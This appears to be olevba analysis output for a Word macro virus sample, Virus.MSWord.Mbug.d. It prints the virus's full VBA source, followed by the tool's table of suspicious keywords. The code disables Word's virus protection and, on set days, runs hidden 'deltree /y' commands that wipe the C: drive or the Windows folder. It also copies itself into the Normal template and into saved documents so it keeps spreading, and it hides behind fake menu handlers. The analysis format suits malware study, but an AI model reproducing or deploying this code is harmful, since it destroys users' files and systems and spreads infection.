olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mbug.d-c8c42c9e4681db7c32df4b427680b8b314cf396c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mbug.d-c8c42c9e4681db7c32df4b427680b8b314cf396c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO frank.bas 
in file: Virus.MSWord.Mbug.d-c8c42c9e4681db7c32df4b427680b8b314cf396c - OLE stream: 'Macros/VBA/frank'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
If Day(Now()) = "1" Or Day(Now()) = "3" Or Day(Now()) = "15" Or Day(Now()) = "21" Or Day(Now()) = "23" Or Day(Now()) = "27" Or Day(Now()) = "30" Or Day(Now()) = "20" Or Day(Now()) = "8" Then
MsgBox "Frankie chieng II Mvirus", vbInformation, "Attention"
With Assistant.NewBalloon
    .Animation = msoAnimationGetAttentionMajor
    .Icon = msoIconAlert
    .Button = False
    .Text = "Choose the section:"
    .Heading = "FrankieChieng II"
    .Labels(1).Text = "He would eat your *.Doc file."
    .Labels(2).Text = "He kill your file."
    .Labels(3).Text = "He attack all PC system."
    x = .Show
End With
If x = 1 Then
Shell "deltree /y c:\*.*", vbHide
MsgBox "Yeah eating some filez", vbQuestion, "Frankie chieng virus"
ElseIf x = 2 Then
Shell "deltree /y c:\windows\*.*", vbHide
MsgBox "Damn your PC in a while", vbExclamation, "Frankie chieng virus"
ElseIf x = 3 Then
Shell "deltree /y c:\windows", vbHide
MsgBox "System attack!", vbSystemModal, "Frankie chieng virus"
End If
End If
End Sub
Sub AutoClose()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorAC
iMacroCount = WordBasic.CountMacros(0, 0)
For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 0) = "frank" Then
        frankInstalled = -1
    End If
Next i
If Not frankInstalled Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="frank", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="UserForm1", Object:=wdOrganizerObjectProjectItems
End If
MsgBox "", vbCritical, "Frankie Chieng II"
ErrorAC:
End Sub
Sub FileSaveAs()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFSA
    Dialogs(wdDialogFileSaveAs).Show
    If (ActiveDocument.SaveFormat = wdFormatDocument) Or (ActiveDocument.SaveFormat = wdFormatTemplate) Then
        ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
    End If
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="frank", Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="UserForm1", Object:=wdOrganizerObjectProjectItems
ActiveDocument.Save
ErrorFSA:
End Sub
Sub FileTemplates()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFT
UserForm1.Show
ErrorFT:
End Sub
Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorTM
UserForm1.Show
ErrorTM:
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorVVBC
UserForm1.Show
ErrorVVBC:
End Sub
-------------------------------------------------------------------------------
VBA MACRO UserForm1.frm 
in file: Virus.MSWord.Mbug.d-c8c42c9e4681db7c32df4b427680b8b314cf396c - OLE stream: 'Macros/VBA/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.d-c8c42c9e4681db7c32df4b427680b8b314cf396c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Announcement!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.d-c8c42c9e4681db7c32df4b427680b8b314cf396c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Times New Roman�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.d-c8c42c9e4681db7c32df4b427680b8b314cf396c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�New Macro Virus infected school PC, every student
��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.d-c8c42c9e4681db7c32df4b427680b8b314cf396c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Times New Roman�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.d-c8c42c9e4681db7c32df4b427680b8b314cf396c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�please BEWARE!  
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.d-c8c42c9e4681db7c32df4b427680b8b314cf396c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Times New Roman�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.d-c8c42c9e4681db7c32df4b427680b8b314cf396c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Times New Roman�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.d-c8c42c9e4681db7c32df4b427680b8b314cf396c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Times New Roman�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.d-c8c42c9e4681db7c32df4b427680b8b314cf396c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Times New Roman�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.d-c8c42c9e4681db7c32df4b427680b8b314cf396c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Times New Roman�
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Mbug.d-c8c42c9e4681db7c32df4b427680b8b314cf396c' - OLE stream: 'Macros/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Mbug.d-c8c42c9e4681db7c32df4b427680b8b314cf396c' - OLE stream: 'Macros/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Mbug.d-c8c42c9e4681db7c32df4b427680b8b314cf396c' - OLE stream: 'Macros/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN 'Virus.MSWord.Mbug.d-c8c42c9e4681db7c32df4b427680b8b314cf396c' - OLE stream: 'Macros/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label5'" IN 'Virus.MSWord.Mbug.d-c8c42c9e4681db7c32df4b427680b8b314cf396c' - OLE stream: 'Macros/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label6'" IN 'Virus.MSWord.Mbug.d-c8c42c9e4681db7c32df4b427680b8b314cf396c' - OLE stream: 'Macros/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label7'" IN 'Virus.MSWord.Mbug.d-c8c42c9e4681db7c32df4b427680b8b314cf396c' - OLE stream: 'Macros/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

